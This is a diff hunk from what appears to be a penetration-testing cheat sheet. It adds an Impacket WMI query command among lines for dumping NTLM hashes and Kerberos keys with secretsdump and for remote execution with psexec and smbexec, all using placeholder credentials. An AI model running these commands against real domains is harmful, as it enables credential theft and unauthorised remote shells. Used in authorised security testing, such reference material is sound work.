@@ -339,6 +339,8 @@ impacket-netview -target 'IP' -delay 'SECOND' -ts 'DOMAIN/USERNAME:PASSWORD'
 # dumping NTLM hashs and Kerberos Keys
 impacket-secretsdump -ts 'DOMAIN/USERNAME:PASSWORD@IP'
 impacket-secretsdump -ts -just-dc-user 'USERNAME' -just-dc-ntlm 'DOMAIN/USERNAME:PASSWORD@IP'
+# wmi
+impacket-wmiquery -debug 'DOMAIN/USERNAME:PASSWORD@IP'
 # exec
 impacket-psexec  -ts 'DOMAIN/USERNAME:PASSWORD@IP'
 impacket-smbexec -share 'SHARENAME' -ts -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
